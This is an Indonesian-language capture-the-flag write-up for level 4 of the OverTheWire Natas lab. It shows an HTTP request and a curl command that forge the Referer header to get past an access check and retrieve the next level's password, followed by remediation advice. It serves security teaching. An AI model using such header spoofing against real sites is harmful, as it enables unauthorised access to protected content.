---
title: "Level 4"
description: Memalsukan header Referer untuk melewati kontrol akses berbasis asal.
sidebarTitle: "Level 4 — Spoofing Referer"
---

## Profil

- **Target:** `http://natas4.natas.labs.overthewire.org`
- **Kredensial:** `natas4` / (password dari Level 3)

## Pengintaian

Halaman menampilkan pesan bahwa akses dibatasi — hanya permintaan yang berasal dari `http://natas5.natas.labs.overthewire.org/` yang diizinkan.

## Analisis

Aplikasi memeriksa header `Referer` di sisi server. Ini adalah pendekatan yang cacat karena:

1. Header `Referer` sepenuhnya dikendalikan oleh klien
2. Dapat dimodifikasi menggunakan alat proxy
3. Beberapa browser dan alat privasi sudah menghapus atau memodifikasi header ini

## Eksploitasi

Menggunakan Burp Suite, intercept permintaan ke `index.php` dan modifikasi header `Referer`:

```http
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Referer: http://natas5.natas.labs.overthewire.org/
```

Atau menggunakan `curl`:

```bash
curl -u natas4:$(cat password4) \
  --referer "http://natas5.natas.labs.overthewire.org/" \
  http://natas4.natas.labs.overthewire.org/
```

## Hasil

Server menerima header palsu dan mengembalikan password untuk Level 5.

## Remediasi

- Jangan pernah menggunakan header `Referer` untuk kontrol akses — header ini mudah dipalsukan
- Gunakan autentikasi berbasis sesi atau token kriptografis
- Validasi otorisasi di sisi server melalui mekanisme autentikasi yang tepat
